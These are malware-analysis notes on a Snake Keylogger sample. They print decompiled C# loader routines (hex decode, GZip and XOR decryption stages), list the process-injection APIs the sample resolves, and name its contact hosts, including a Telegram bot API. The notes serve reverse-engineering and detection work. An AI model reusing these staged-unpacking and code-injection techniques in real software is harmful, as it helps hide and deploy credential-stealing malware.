#snakeKeylogger :
SHA256: 8c92fe975db6f552f522fbd9a8e542ae2e78cc0c21bb5e316b883b23e0084038

Sample is Microsoft Visual C# / Basic.NET [ Obfus/Crypted ], and 32 bit executable
File is packed , since the entropy value is high (Entropy: 7.53124(packed))


Decryption loop: 
	int num = (text.Length + 1) / 3;
		byte[] array = new byte[num];
			for (int i = 0; i < num; i++)
			{
				char c = text[3 * i];
				bool flag = c > '9';
				if (flag)
				{
					c = c - 'A' + '\n';
				}
				else
				{
					c -= '0';
				}
				char c2 = text[3 * i + 1];
				bool flag2 = c2 > '9';
				if (flag2)
				{
					c2 = c2 - 'A' + '\n';
				}
				else
				{
					c2 -= '0';
				}
				array[i] = (byte)('\u0010' * c + c2);
			}
      
The above loop decryptes the second stage dll executable. Also, invoke member, method info function are being called to enter the second stage.

{Name = "vL" FullName = 
"UO.vL"] 
"UO.vLA6(System.String, System.String, System.String)" 


Second stage decryption loop:

		public static byte[] ND(byte[] \u0020)
		{
			GZipStream gzipStream = new GZipStream(new MemoryStream(\u0020), CompressionMode.Decompress);
			byte[] result;
			try
			{
				byte[] array = new byte[4096];
				MemoryStream memoryStream = new MemoryStream();
				try
				{
					int num;
					do
					{
						num = vd.Fq(gzipStream, array, 0, 4096, vd.dW);
						bool flag = num > 0;
						if (flag)
						{
							global::kT.Fq(memoryStream, array, 0, num, global::kT.sS);
						}
					}
					while (num > 0);
					result = sB.Fq(memoryStream, sB.V1);
				}
				finally
				{
					if (memoryStream != null)
					{
						ae.Fq(memoryStream, ae.af);
					}
				}
			}
			finally
			{
				if (gzipStream != null)
				{
					ae.Fq(gzipStream, ae.af);
				}
			}
			return result;
		}
    
    
    The loop returns another dll file and it is invoked using method info and invoke function.
    
    {Name = "Himentater" FullName = "Munoz.Himentater"}
    
    public static byte[] SearchResult(byte[] BinaryCompatibility, string Opcode)
		{
			byte[] array = \u007F.~\u0093(\u001D.\u0090(), Opcode);
			int num = (int)(BinaryCompatibility[BinaryCompatibility.Length - 1] ^ 112);
			byte[] array2 = new byte[BinaryCompatibility.Length + 1];
			int num2 = 0;
			for (int i = 0; i <= BinaryCompatibility.Length - 1; i++)
			{
				int num3 = (int)BinaryCompatibility[i] ^ num ^ (int)array[num2];
				array2[i] = (byte)num3;
				bool flag = num2 == \u0014.~\u0080(Opcode) + 100 - 101;
				if (flag)
				{
					num2 = 0;
				}
				else
				{
					num2 = num2 + 200 - 199;
				}
			}
			Array.Resize<byte>(ref array2, BinaryCompatibility.Length - 1);
			return array2;
		}
The above loop decrypts the acutal payload and invoked the below function.
   
{Name = "Gq" FullName = "KW.Gq"}
    
The acutal payload:
08b07fb8ba550a1b9e1fa53797d69dc6
    
It is resolving virutalALlocEX,CreateProcessA, NTunmapviewsection, SetThreadContext, ReadProcessMEmory (codeInjection)
Also tries to connect to checkip.dyndns.org & api.telegram.com/bot
found strings related to snakeKeylogger.
